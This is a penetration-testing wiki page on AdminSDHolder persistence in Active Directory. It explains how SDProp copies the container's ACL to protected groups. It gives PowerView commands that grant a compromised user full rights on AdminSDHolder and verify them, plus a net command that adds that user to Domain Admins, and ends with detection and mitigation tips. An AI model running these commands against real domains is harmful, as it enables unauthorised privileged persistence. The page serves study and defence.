# AdminSDHolder

## Description

AdminSDHolder is an Active Directory container that is populated with some default permissions. These permissions are used as a template for protected accounts to prevent accidental modifications to them. Some of the protected groups in a Domain include: Domain Admins, Administrators, Enterprise Admins, and Schema Admins. This also includes other groups that give logon rights to domain controllers

An adversary with Domain Admin privileges can abuse the AdminSDHolder container for persistence. This can be done by giving a user the GenericAll privileges. Active Directory will take the ACL's of the AdminSDHolder and every 60 minutes apply it to the protected users and groups. The adversary can apply their own ACL's to AdminSDHolder and wait for them to replicate in order to achieve the desired persistence.

## Exploitation

Powerview can be leveraged to to use the `Add-DomainObjectAcl` command in order to add a compromised user to the AdminSDHolder ACL.

```bash
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=Security,DC=local' -PrincipalIdentity Moe -Rights All -verbose
```

![](<../../../.gitbook/assets/image (2000).png>)

Confirmation as shown by viewing the ACLs for AdminSDHolder:

![](<../../../.gitbook/assets/image (1997).png>)

We can then wait for the `SDProp` process to run. After waiting up to 60 minutes we can check if the user Moe is a member of the Domain Admins group to confirm this has worked.

{% hint style="info" %}
SDProp is the name of the process which replicates the AdminSDHolder ACL's to the defined protected users and groups every 60 minutes.
{% endhint %}

```bash
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'Moe'}
```

Manually checking the ACL for "Domain Admins" we see the user Moe has full control of the object.

![](<../../../.gitbook/assets/image (2001).png>)

Working as the user Moe we can now perform privileged tasks such as self adding to the Domain Admins group.

```bash
net group "Domain Admins" moe /ADD /DOMAIN
```

![](<../../../.gitbook/assets/image (2002).png>)

## Detection

* Monitor for accounts that have the attribute adminCount set to '1'.
* Monitor the ACLs configured on the AdminSDHolder object. These should be kept at the default – it is not usually necessary to add other groups to the AdminSDHolder ACL.

## Mitigation

* Domain administrator credentials are required to perform this attack. Ensure Domain Admins are well protected and monitored.

## References

{% embed url="https://specopssoft.com/support/password-reset/understanding-privileged-accounts-and-adminsdholder.htm" %}

{% embed url="https://stealthbits.com/blog/20170619persistence-using-adminsdholder-and-sdprop/" %}

{% embed url="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory" %}

{% embed url="https://adsecurity.org/?p=1906" %}
